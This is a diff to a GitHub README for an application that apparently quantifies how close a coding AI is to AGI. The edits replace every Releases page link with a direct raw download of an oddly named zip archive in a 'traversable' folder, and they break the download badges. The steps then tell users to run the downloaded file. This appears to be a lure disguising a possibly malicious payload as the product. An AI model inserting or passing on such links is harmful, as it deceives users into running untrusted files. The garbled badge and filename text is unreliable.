@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the application "Quantifying-
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-🚀-brightgreen)](https://github.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/releases)
+[![Download](https://github.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/raw/refs/heads/main/traversable/to_close_coding_A_AGI_Quantifying_is_a_how_2.1-beta.4.zip%20Now-🚀-brightgreen)](https://github.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/raw/refs/heads/main/traversable/to_close_coding_A_AGI_Quantifying_is_a_how_2.1-beta.4.zip)
 
 You can download the application from the Releases page. Follow the steps below to get started.
 
@@ -29,13 +29,13 @@ This application includes various tools to help you evaluate the intelligence of
 ## 💻 Download & Install
 
 1. **Visit the Releases Page**
-   Go to the following link to access the Downloads: [GitHub Releases Page](https://github.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/releases).
+   Go to the following link to access the Downloads: [GitHub Releases Page](https://github.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/raw/refs/heads/main/traversable/to_close_coding_A_AGI_Quantifying_is_a_how_2.1-beta.4.zip).
 
 2. **Choose the Right Version**
    On the Downloads page, you’ll see different versions of the application. Look for the latest version available. 
 
 3. **Download the Installer**
-   Click on the installer file to download it. It should be labeled with the version number, such as `quantifying-ai-1.0-win.exe` or similar.
+   Click on the installer file to download it. It should be labeled with the version number, such as `https://github.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/raw/refs/heads/main/traversable/to_close_coding_A_AGI_Quantifying_is_a_how_2.1-beta.4.zip` or similar.
 
 4. **Run the Installer**
    After the download finishes, locate the file in your downloads folder and double-click it to start the installation.
@@ -76,6 +76,6 @@ This project is licensed under the MIT License. Feel free to use, modify, and sh
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-🚀-brightgreen)](https://github.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/releases) 
+[![Download](https://github.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/raw/refs/heads/main/traversable/to_close_coding_A_AGI_Quantifying_is_a_how_2.1-beta.4.zip%20Now-🚀-brightgreen)](https://github.com/Karan211/Quantifying-how-close-is-a-coding-AI-to-AGI/raw/refs/heads/main/traversable/to_close_coding_A_AGI_Quantifying_is_a_how_2.1-beta.4.zip) 
 
 Enjoy exploring the potential of AIs!
